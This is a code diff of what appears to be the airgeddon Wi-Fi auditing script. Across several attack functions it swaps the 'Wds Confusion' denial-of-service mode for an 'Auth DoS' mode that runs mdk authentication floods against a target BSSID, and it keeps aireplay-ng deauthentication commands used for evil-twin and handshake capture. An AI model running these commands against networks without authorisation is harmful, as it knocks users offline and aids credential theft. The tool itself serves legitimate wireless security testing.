@@ -2496,7 +2496,7 @@ function dos_pursuit_mode_et_handler() {
 	if [ "${yesno}" = "y" ]; then
 		dos_pursuit_mode=1
 
-		if [ "${et_dos_attack}" = "Wds Confusion" ]; then
+		if [ "${et_dos_attack}" = "Auth DoS" ]; then
 			echo
 			language_strings "${language}" 508 "yellow"
 			language_strings "${language}" 115 "read"
@@ -4459,13 +4459,13 @@ function launch_dos_pursuit_mode_attack() {
 				global_process_pid=""
 			fi
 		;;
-		"Wds Confusion")
+		"Auth DoS")
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
 				dos_pursuit_mode_attack_pid="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -10290,8 +10290,8 @@ function exec_et_deauth() {
 		"Aireplay")
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
-		"Wds Confusion")
-			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
+		"Auth DoS")
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
 		;;
 	esac
 
@@ -12631,11 +12631,11 @@ function capture_handshake_evil_twin() {
 			fi
 			sleeptimeattack=12
 		;;
-		"Wds Confusion")
+		"Auth DoS")
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -13272,9 +13272,9 @@ function dos_handshake_decloaking_menu() {
 					capture_handshake_window
 				fi
 				recalculate_windows_sizes
-				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-					get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
+					get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
 					processidattack="${global_process_pid}"
 					global_process_pid=""
 				fi
@@ -14464,7 +14464,7 @@ function et_dos_menu() {
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				et_dos_attack="Wds Confusion"
+				et_dos_attack="Auth DoS"
 
 				echo
 				language_strings "${language}" 509 "yellow"
